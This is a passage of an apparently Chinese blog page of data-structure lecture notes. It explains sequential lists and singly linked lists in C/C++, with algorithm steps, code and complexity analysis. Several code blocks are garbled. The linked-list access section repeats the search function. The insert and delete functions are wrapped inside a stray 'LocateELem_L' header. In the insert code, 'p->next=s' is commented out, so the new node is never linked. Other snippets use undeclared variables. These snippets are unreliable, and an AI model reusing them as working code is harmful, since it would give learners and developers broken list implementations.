class="keyword">sizeof</span>(x)</span><br><span class="line"><span class="comment">//计算变量x的长度。</span></span><br><span class="line"><span class="built_in">free</span>(p)</span><br><span class="line"><span class="comment">// 释放指针p所指变量的存储空间，即彻底删除一个变量</span></span><br></pre></td></tr></table></figure><h3 id="4-2线性表的重要基本操作"><a href="#4-2线性表的重要基本操作" class="headerlink" title="4.2线性表的重要基本操作"></a>4.2线性表的重要基本操作</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>参数用引用的情况:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitList_Sq</span><span class="params">(SqList &amp;L)</span> <span class="comment">//构造一 个空的顺序表L </span></span><br><span class="line">&#123;</span><br><span class="line">L.elem=new ElemType[MAXSIZE]; <span class="comment">//为顺序表分配空间</span></span><br><span class="line"><span class="keyword">if</span>(!L.elem) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//存储分配失败</span></span><br><span class="line">L.length=<span class="number">0</span>; <span class="comment">//空表长度为0</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数用指针的情况:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitList_Sq</span><span class="params">(SqList *L)</span> <span class="comment">//构造一个空的顺序表L</span></span><br><span class="line"> &#123; L-&gt; elem=new ElemType[MAXSIZE]; <span class="comment">//为顺序表分配空间</span></span><br><span class="line"><span class="keyword">if</span>(! L-&gt; elem) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//存储分配失败</span></span><br><span class="line">L-&gt; length=<span class="number">0</span>; <span class="comment">//空表长度为0</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>补充：几个简单基本操作的算法实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">销毁线性表L:</span><br><span class="line"><span class="type">void</span> <span class="title function_">DestroyList</span><span class="params">(SqList &amp;L)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (L.elem) delete[]L.elem;</span><br><span class="line"><span class="comment">//释放存储空间（如果存在元</span></span><br><span class="line">素） </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">清空线性表L:</span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearList</span><span class="params">(SqList &amp;L)</span> </span><br><span class="line">&#123;</span><br><span class="line">L.length=<span class="number">0</span>; </span><br><span class="line"><span class="comment">//将线性表的长度置为0 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">求线性表L的长度:</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetLength</span><span class="params">(SqList L)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (L.length); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">判断线性表L是否为空:</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(SqList L)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (L.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h4><p>随机存取</p><p>获取线性表L中的某个数据元素的内容:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetElem</span><span class="params">(SqList L, <span class="type">int</span> i, ElemType &amp;e)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span>||i&gt;L.length) <span class="keyword">return</span> ERROR;</span><br><span class="line"><span class="comment">//判断i值是否合理，若不合理，返回ERROR</span></span><br><span class="line">e=L.elem[i<span class="number">-1</span>]; <span class="comment">//第i-1的单元存储着第i个数据</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>在线性表L中查找值为e的数据元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem</span><span class="params">(SqList L,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; L.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (L.elem[i]==e) <span class="keyword">return</span> i+<span class="number">1</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>平均查找长度（ASL）：在执行查找时，为确定元素在顺序表中的位置，须和给定值<strong>进行比较的数据元素个数的期望值</strong>成为查找算法在查找成功时的平均查找长度（ASL）。</p><p>最好的情况：需比较1次<br>最坏的情况：需比较n次<br>如果每个元素的查找概率相等，即p&#x3D;1&#x2F;n,</p><blockquote><p>则平均查找长度为 <em><strong>(n+1)&#x2F;2</strong></em></p></blockquote><p>平均时间复杂度O(n)</p><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><ul><li>插第 4 个结点之前，移动 6-4+1 次</li><li>插在n个元素的第 i 个结点之前，移动 n-i+1 次</li></ul><blockquote><p>【算法步骤】</p></blockquote><p>1.判断插入位置i 是否合法。 </p><p>2.判断顺序表的存储空间是否已满。</p><p>3.将第n至第i 位的元素依次向后移<br>动一个位置，空出第i个位置。</p><p>4.将要插入的新元素e放入第i个位置</p><p>5.表长加1，插入成功返<br>回OK。</p><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_Sq</span> <span class="params">(SqList &amp;L, <span class="type">int</span> i, ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L.length+<span class="number">1</span>) <span class="keyword">return</span> ERROR; <span class="comment">//i值不合法</span></span><br><span class="line"><span class="keyword">if</span> (L.length==MAXSIZE) <span class="keyword">return</span> ERROR; <span class="comment">//当前存储空间已满</span></span><br><span class="line"><span class="keyword">for</span> (j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;j--) </span><br><span class="line">L.elem[j+<span class="number">1</span>]=L.elem[j]; <span class="comment">//插入位置及之后的元素后移</span></span><br><span class="line">L.elem[i<span class="number">-1</span>]=e; <span class="comment">//将新元素e放入第i个位置</span></span><br><span class="line">++L.length; <span class="comment">//表长增1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>【算法分析】</p></blockquote><p>算法时间主要耗费在移动元素的操作上</p><ul><li>若插入在尾结点之后，则根本无需移动（特别快）；</li><li>若插入在首节点之前，若元素全部后移（特别慢）；</li><li>若要考虑在各种位置插入（n个元素，共n+1种插入可能）的平均移动次数</li></ul><blockquote><p>平均移动次数（AMN）<em><strong>n&#x2F;2</strong></em></p></blockquote><p>平均时间复杂度O(n)</p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><blockquote><p>【算法步骤】</p></blockquote><p>（1）判断删除位置 i 是否合法（合法值为1≤i≤n）。</p><p>（2）将第i+1至第n 位的元素依次向前移动一个位置。</p><p> （3）表长减1，删除成功返回OK。</p><blockquote><p>【算法描述】</p></blockquote><p> 将线性表L中第i个数据元素删除<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> Status <span class="title function_">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length)) <span class="keyword">return</span> ERROR; <span class="comment">//i值不合法</span></span><br><span class="line"><span class="keyword">for</span> (j=i; j&lt;=L.length<span class="number">-1</span>; j++) </span><br><span class="line">L.elem[j<span class="number">-1</span>]=L.elem[j]; <span class="comment">//被删除元素之后的元素前移</span></span><br><span class="line">--L.length; <span class="comment">//表长减1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>【算法分析】</p></blockquote><p>算法时间主要耗费在移动元素的操作上</p><ul><li>若删除尾结点，则根本无需移动（特别快）；</li><li>若删除首结点，则表中n-1个元素全部前移（特别慢）；</li><li>若要考虑在各种位置删除（n个元素，共n种可能）的平均移动次数，该如何计算？</li></ul><blockquote><p>平均移动次数 <em><strong>(n-1)&#x2F;2</strong></em></p></blockquote><p>平均时间复杂度O(n)</p><h3 id="4-3顺序表的特点"><a href="#4-3顺序表的特点" class="headerlink" title="4.3顺序表的特点"></a>4.3顺序表的特点</h3><ul><li><p>利用数据元素的存储位置表示线性表中相邻数据元素之间的前后关系，即 <strong>线性表的逻辑结构与存储结构一致</strong></p></li><li><p>在访问线性表时，可以快速地计算出任何一个数据元素的存储地址。因此可以粗略地认为，<strong>访问每个元素所花时间相等</strong></p></li></ul><p>这种存取元素的方法被称为随机存取法!</p><pre><code>优点:存储密度大（结点本身所占存储量/结点结构所占存储量）可以随机存取表中任一元素缺点:在插入、删除某一元素时，需要移动大量元素初始分配固定空间，浪费存储空间属于静态存储形式，数据元素的个数不能自由扩充</code></pre><h2 id="5线性表的链式表示和实现"><a href="#5线性表的链式表示和实现" class="headerlink" title="5线性表的链式表示和实现"></a>5线性表的链式表示和实现</h2><p><em><strong>链式存储结构</strong></em><br>结点在存储器中的位置是任意<br>的，即逻辑上相邻的数据元素<br>在物理上不一定相邻</p><p>线性表的链式表示又称为非顺序映像或链式映像。</p><p>通过指针来实现</p><h3 id="5-1与链式存储有关的术语"><a href="#5-1与链式存储有关的术语" class="headerlink" title="5.1与链式存储有关的术语"></a>5.1与链式存储有关的术语</h3><p>1、<strong>结点</strong>：数据元素的存储映像。由数据域和指针域两部分组成</p><p>2、<strong>链表</strong>：n 个结点由指针链组成一个链表。它是线性表的链式存储映像，称为线性表的链式存储结构</p><p>3、<strong>单链表、双链表、循环链表</strong>： </p><ul><li>结点只有一个指针域的链表，称为单链表或线性链表</li><li>有两个指针域的链表，称为双链表</li><li>首尾相接的链表称为循环链表</li></ul><p>4、<strong>头指针、头结点和首元结点</strong>:</p><ul><li>头指针是指向链表中第一个结点的指针</li><li>头结点是在链表的首元结点之前附设的一个结点 <strong>（不是第一个元素节点！！）</strong>；数据域内只放空表标志和表长等信息</li><li>首元结点是指链表中存储第一个数据元素a1的结点</li></ul><p><img src="/img/%E7%A9%BA%E8%A1%A8%E7%9A%84%E8%A1%A8%E7%A4%BA.png" alt="空表的表示"></p><p><img src="/img/%E5%A4%B4%E7%BB%93%E7%82%B9%E7%9A%84%E5%A5%BD%E5%A4%84.png" alt="头结点的好处"></p><p><img src="/img/%E5%A4%B4%E8%8A%82%E7%82%B9%E7%9A%84%E6%95%B0%E6%8D%AE%E5%9F%9F.png" alt="头节点的数据域"></p><h3 id="5-2链表（链式存储结构）的特点"><a href="#5-2链表（链式存储结构）的特点" class="headerlink" title="5.2链表（链式存储结构）的特点"></a>5.2链表（链式存储结构）的特点</h3><ul><li>结点在存储器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻</li><li>访问时只能通过头指针进入链表，并通过每个结点的指针域向后扫描其余结点，所以寻找第一个结点和最后一个结点所花费的时间不等!!!<blockquote><p>这种存取元素的方法被称为 <strong>顺序存取法</strong></p></blockquote></li></ul><p>链表的优缺点:</p><p>优点</p><ul><li>数据元素的个数可以自由扩充</li><li>插入、删除等操作不必移动数据，只需修改链接指针，修改效率较高</li></ul><p>缺点</p><ul><li>存储密度小</li><li>存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问（顺藤摸瓜）</li></ul><h3 id="5-3单链表的定义和实现"><a href="#5-3单链表的定义和实现" class="headerlink" title="5.3单链表的定义和实现"></a>5.3单链表的定义和实现</h3><p>单链表是由表头唯一确定，因此单链表可以用头指针的名字来命名</p><p>若头指针名是L，则把链表称为表L</p><blockquote><p>单链表的存储结构定义</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ElemType data; <span class="comment">//节点的数据域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span> <span class="comment">//节点的指针域</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"><span class="comment">// *LinkList为Lnode类型的指针</span></span><br></pre></td></tr></table></figure><ul><li><p>LinkList与LNode *本质是等价的，Linklist定义单链表强调链表的头指针p，LNode定义指向单链表中任意节点的指针p</p></li><li><p>注意区分指针变量和结点变量两个不同的概念</p><pre><code>  指针变量 p ：表示结点地址  结点变量*p：表示一个结点</code></pre></li><li><p>若p-&gt;data&#x3D;ai, &#x2F;&#x2F;p是指向第i个元素的ai的指针，</p><p>  则p-&gt;next是指向第i+1个元素的指针</p><p>  则p-&gt;next-&gt;data&#x3D;ai+1</p></li></ul><blockquote><p>单链表基本操作的实现</p></blockquote><p>初始化; 取值; 查找; 插入; 删除.</p><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><blockquote><p>【算法步骤】 </p></blockquote><p>（1）生成新结点作头结点，用头指针L指向头结点。 </p><p>（2）头结点的指针域置空</p><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitList_L</span><span class="params">(LinkList &amp;L)</span></span><br><span class="line">&#123; </span><br><span class="line">L=new LNode; <span class="comment">//头指针L指向头结点</span></span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//头结点的指针域置空（头结点的指针域指</span></span><br><span class="line">向第一个节点）</span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>补充：几个简单基本操作的算法实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">销毁:</span><br><span class="line"></span><br><span class="line">Status <span class="title function_">DestroyList_L</span><span class="params">(LinkList &amp;L)</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList p;</span><br><span class="line"><span class="keyword">while</span> (L) <span class="comment">//只要链表头指针不为空</span></span><br><span class="line">&#123;</span><br><span class="line">p=L; <span class="comment">//链表的头指针赋值给p（用于辅助操作指针变量）</span></span><br><span class="line">L=L-&gt;next; <span class="comment">//链表头结点的指针赋值给头指针（头指针指</span></span><br><span class="line">向下一个节点）</span><br><span class="line">delete p; <span class="comment">//删除指针p指向的节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">清空:</span><br><span class="line">Status <span class="title function_">ClearList</span><span class="params">(LinkList &amp; L)</span>&#123;<span class="comment">// 将L重置为空表</span></span><br><span class="line">LinkList p,q;</span><br><span class="line">p=L-&gt;next; <span class="comment">//p指向第一个元素结点</span></span><br><span class="line"><span class="keyword">while</span>(p) <span class="comment">//没到表尾（当最后一个节点被删除后，p指针</span></span><br><span class="line">将变为空指针）</span><br><span class="line">&#123; </span><br><span class="line">q=p-&gt;next; <span class="comment">//指针q指向下一个节点</span></span><br><span class="line">delete p; <span class="comment">//删除p指向的当前节点</span></span><br><span class="line">p=q; <span class="comment">//指针p指向下一个节点</span></span><br><span class="line">&#125;L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//头结点指针域为空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">求表的长度:</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength_L</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line"><span class="comment">//返回L中数据元素个数</span></span><br><span class="line">LinkList p;</span><br><span class="line">p=L-&gt;next; <span class="comment">//p指向第一个结点</span></span><br><span class="line">i=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span>(p)&#123;<span class="comment">//遍历单链表,统计结点数</span></span><br><span class="line">i++;</span><br><span class="line">p=p-&gt;next; &#125;</span><br><span class="line"><span class="keyword">return</span> i; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">判断表是否为空:</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListEmpty</span><span class="params">(LinkList L)</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">//若L为空表，则返回1，否则返回0</span></span><br><span class="line"><span class="keyword">if</span>(L-&gt;next) <span class="comment">//非空</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取值-1"><a href="#取值-1" class="headerlink" title="取值"></a>取值</h4><p>链表不是随机存取结构</p><blockquote><p>【算法步骤】</p></blockquote><ul><li>从第1个结点（L-&gt;next）顺链扫描，用指针p指向当前扫描到的结点，p初值p &#x3D; L-&gt;next。 </li><li>j做计数器，累计当前扫描过的结点数，j初值为1。当p指向扫描到的下一结点时，计数器j加1。</li><li>当j &#x3D; i时，p所指的结点就是要找的第i个结点。</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//返回L中值为e的数据元素的位置序号，查找失败返回0</span></span><br><span class="line">p=L-&gt;next; j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(p &amp;&amp;p-&gt;data!=e) </span><br><span class="line">&#123;p=p-&gt;next; j++;&#125; </span><br><span class="line"><span class="keyword">if</span>(p) <span class="keyword">return</span> j; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h4><blockquote><p>【算法步骤】</p></blockquote><ul><li>从第一个结点起，依次和e相比较。 </li><li>如果找到一个其值与e相等的数据元素，则返回其在链表中的“位置”或地址（第几个元素，注意j的初始值为1）； </li><li>如果查遍整个链表都没有找到其值和e相等的元素，则返回0 或“NULL”。</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//返回L中值为e的数据元素的位置序号，查找失败返回0</span></span><br><span class="line">p=L-&gt;next; j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(p &amp;&amp;p-&gt;data!=e) </span><br><span class="line">&#123;p=p-&gt;next; j++;&#125; </span><br><span class="line"><span class="keyword">if</span>(p) <span class="keyword">return</span> j; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h4><blockquote><p>【算法步骤】</p></blockquote><ul><li>找到ai-1存储位置p</li><li>生成一个新结点*s</li><li>将新结点*s的数据域置为x</li><li>新结点*s的指针域指向结点ai</li><li>令结点 *p 的指针域指向新结点 *s</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//在L中第i个元素之前插入数据元素e </span></span><br><span class="line">Status <span class="title function_">ListInsert_L</span><span class="params">(LinkList &amp;L, <span class="type">int</span> i, ElemType e)</span>&#123; </span><br><span class="line">p=L; j=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span>(p&amp;&amp;j&lt;i−<span class="number">1</span>)&#123;p=p-&gt;next;++j;&#125; <span class="comment">//寻找第i−1个结点</span></span><br><span class="line"><span class="keyword">if</span>(!p || j&gt;i−<span class="number">1</span>) <span class="keyword">return</span> ERROR; <span class="comment">//i大于表长 + 1或者小于1 </span></span><br><span class="line">s=new LNode; <span class="comment">//生成新结点s </span></span><br><span class="line">s-&gt;data=e; <span class="comment">//将结点s的数据域置为e </span></span><br><span class="line">s-&gt;next=p-&gt;next; <span class="comment">//将结点s插入L中 p-&gt;next=s; </span></span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;<span class="comment">//ListInsert_L</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><blockquote><p>【算法步骤】</p></blockquote><ul><li>（1）找到ai-1存储位置p </li><li>（2）临时保存结点ai的地址在q中，以备释放</li><li>（3）令p-＞next指向ai的直接后继结点</li><li>（4）将ai的值保留在e中</li><li>（5）释放结点ai的空间</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将线性表L中第i个数据元素删除</span></span><br><span class="line">Status <span class="title function_">ListDelete_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">p=L;j=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span>(p-&gt;next &amp;&amp;j&lt;i<span class="number">-1</span>)&#123; <span class="comment">//寻找第i个结点，并令p指向其前驱ai-1</span></span><br><span class="line">p=p-&gt;next; ++j; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(!(p-&gt;next)||j&gt;i<span class="number">-1</span>) <span class="keyword">return</span> ERROR; <span class="comment">//删除位置不合理(i&gt;n或i&lt;1)</span></span><br><span class="line">q=p-&gt;next; <span class="comment">//临时保存被删结点的地址以备释放</span></span><br><span class="line">p-&gt;next=q-&gt;next; <span class="comment">//改变删除结点前驱结点的指针域</span></span><br><span class="line">e=q-&gt;data; <span class="comment">//保存删除结点的数据域</span></span><br><span class="line">delete q; <span class="comment">//释放删除结点的空间</span></span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;<span class="comment">//ListDelete_L</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>【算法分析】</p></blockquote><p>-p-&gt;next &#x3D; p-&gt;next-&gt;next 可以吗???</p><p>不行！节点ai无法释放空间</p><h3 id="5-4链表的运算时间效率分析"><a href="#5-4链表的运算时间效率分析" class="headerlink" title="5.4链表的运算时间效率分析"></a>5.4链表的运算时间效率分析</h3><ol><li><p>查找: 因线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为 O(n)。</p></li><li><p>插入和删除: 因线性链表不需要移动元素，只要修改指针，在确定插入和删除位置后，时间复杂度为O(1)。</p></li></ol><p>但是，如果要在单链表中进行前插或删除操作，由于要<br>从头查找前驱结点，所耗时间复杂度为 O(n) 。</p><h3 id="5-5单链表的建立（前插法）"><a href="#5-5单链表的建立（前插法）" class="headerlink" title="5.5单链表的建立（前插法）"></a>5.5单链表的建立（前插法）</h3><blockquote><p>【算法步骤】</p></blockquote><ul><li>建立线性表的链式存储过程即是动态生成链表的过程</li><li>从一个空表开始，重复读入数据<ul><li>生成新结点*p </li><li>将读入数据存放到新结点*p的数据域中</li><li>将该新结点*p插入到链表的前端</li></ul></li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_F</span><span class="params">(LinkList &amp;L,<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="comment">//逆位序输入n个元素的值，建立带表头结点的单链表L </span></span><br><span class="line">L=new LNode; </span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的单链表</span></span><br><span class="line"><span class="keyword">for</span>(i=n; i&gt;<span class="number">0</span>; --i)&#123; </span><br><span class="line">p=new LNode; <span class="comment">//生成新结点</span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;p-&gt;data; <span class="comment">//输入元素值</span></span><br><span class="line">p-&gt;next=L-&gt;next;L-&gt;next=p; <span class="comment">//插入到表头</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;<span class="comment">//CreateList_F</span></span><br></pre></td></tr></table></figure><h3 id="5-6单链表的建立（尾插法）"><a href="#5-6单链表的建立（尾插法）" class="headerlink" 